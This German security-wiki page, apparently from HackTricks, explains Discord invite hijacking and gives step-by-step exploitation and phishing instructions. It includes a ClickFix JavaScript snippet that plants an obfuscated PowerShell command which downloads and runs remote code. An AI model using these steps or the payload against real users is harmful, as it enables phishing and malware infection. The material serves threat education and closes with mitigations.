# Discord Invite Hijacking

Discord invite hijacking missbraucht die Regeln zur Wiederverwendung benutzerdefinierter Vanity-Links: Ein abgelaufener temporärer Invite-Code oder ein gelöschter permanenter Code, der ausschließlich aus Kleinbuchstaben und Ziffern besteht, kann als Vanity-Link auf einem Server mit Level-3-Boost registriert werden. Ein benutzerdefinierter Vanity-Link kann ebenfalls verfügbar werden, wenn der ursprüngliche Server seinen Level-3-Boost verliert. Bei einem temporären Invite mit Großbuchstaben kann ein Angreifer die kleingeschriebene Vanity-Variante vorab registrieren, während der reguläre Invite aktiv bleibt; die Weiterleitung beginnt jedoch erst, nachdem dieser Invite abgelaufen ist.<sup>[[1]](#references)[[2]](#references)</sup>

## Invite-Typen und Hijacking-Risiko

Das beobachtete Risiko unterscheidet sich je nach Invite-Typ:<sup>[[1]](#references)[[2]](#references)</sup>

| Invite-Typ           | Hijackbar? | Bedingung / Kommentare                                                                                       |
|-----------------------|-------------|------------------------------------------------------------------------------------------------------------|
| Temporärer Invite-Link | ✅          | Nach Ablauf wird der Code verfügbar und kann von einem geboosteten Server erneut als Vanity-URL registriert werden. |
| Permanenter Invite-Link | ⚠️          | Wenn er gelöscht wurde und ausschließlich aus Kleinbuchstaben und Ziffern besteht, kann der Code wieder verfügbar werden.        |
| Benutzerdefinierter Vanity-Link    | ✅          | Wenn der ursprüngliche Server seinen Level-3-Boost verliert, wird sein Vanity-Invite für eine neue Registrierung verfügbar.    |

## Exploitation-Schritte

1. Aufklärung
- Öffentliche Quellen (Foren, soziale Medien, Telegram-Kanäle) auf Invite-Links überwachen, die dem Muster `discord.gg/{code}` oder `discord.com/invite/{code}` entsprechen.<sup>[[1]](#references)</sup>
- Interessante Invite-Codes (temporäre oder Vanity-Codes) sammeln.<sup>[[1]](#references)</sup>
2. Vorabregistrierung
- Einen Discord-Server mit Level-3-Boost-Berechtigungen erstellen oder einen bestehenden verwenden.<sup>[[1]](#references)[[2]](#references)</sup>
- Unter **Server Settings → Vanity URL** versuchen, den Ziel-Invite-Code zuzuweisen. Wenn dies akzeptiert wird, ist der Code durch den bösartigen Server reserviert.<sup>[[1]](#references)</sup>
3. Aktivierung des Hijackings
- Bei temporären Invites warten, bis der ursprüngliche Invite abläuft (oder ihn manuell löschen, wenn du die Quelle kontrollierst).<sup>[[1]](#references)</sup>
- Bei Codes mit Großbuchstaben kann die kleingeschriebene Variante sofort beansprucht werden, die Weiterleitung wird jedoch erst nach Ablauf aktiviert.<sup>[[1]](#references)</sup>
4. Unbemerkte Weiterleitung
- Benutzer, die den alten Link aufrufen, werden nahtlos zum vom Angreifer kontrollierten Server weitergeleitet, sobald das Hijacking aktiv ist.<sup>[[1]](#references)</sup>

## Phishing-Ablauf über einen Discord-Server

1. Serverkanäle so einschränken, dass nur ein **#verify**-Kanal sichtbar ist.<sup>[[1]](#references)</sup>
2. Einen Bot (z. B. **Safeguard#0786**) einsetzen, der neue Benutzer auffordert, sich über OAuth2 zu verifizieren.<sup>[[1]](#references)</sup>
3. Der Bot leitet Benutzer unter dem Vorwand eines CAPTCHA- oder Verifizierungsschritts auf eine Phishing-Seite (z. B. `captchaguard.me`) weiter.<sup>[[1]](#references)</sup>
4. Den **ClickFix**-UX-Trick implementieren:<sup>[[1]](#references)</sup>
- Eine fehlerhafte CAPTCHA-Nachricht anzeigen.
- Benutzer anleiten, den **Win+R**-Dialog zu öffnen, einen vorbereiteten PowerShell-Befehl einzufügen und Enter zu drücken.

### ClickFix-Beispiel für Clipboard-Injection

Die Kampagne verwendete JavaScript, um einen bösartigen PowerShell-Befehl in die Zwischenablage zu kopieren:<sup>[[1]](#references)</sup>
```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
`$u=($r[-1..-($r.Length)]-join '');` +
`$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
`iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```
Dieser Ansatz vermeidet direkte Datei-Downloads und nutzt vertraute UI-Elemente, um das Misstrauen der Benutzer zu verringern.<sup>[[1]](#references)</sup>

## Mitigations

- Bevorzugen Sie permanente Invite-Links und stellen Sie sicher, dass der Code mindestens einen Großbuchstaben enthält; gelöschte permanente Codes mit Großbuchstaben können nicht als Vanity-Links wiederverwendet werden.<sup>[[1]](#references)</sup>
- Rotieren Sie Invite-Codes regelmäßig und widerrufen Sie alte Links.
- Überwachen Sie den Discord-Server-Boost-Status und das Beanspruchen von Vanity-URLs.<sup>[[1]](#references)[[2]](#references)</sup>
- Schulen Sie Benutzer darin, die Authentizität des Servers zu überprüfen und das Ausführen von aus der Zwischenablage eingefügten Befehlen zu vermeiden.

## References

- [1] [Vom Vertrauen zur Bedrohung: Hijacked Discord Invites für die mehrstufige Malware-Bereitstellung](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
- [2] [Benutzerdefinierter Invite-Link – Discord Support](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)
{{#include ../../banners/hacktricks-training.md}}
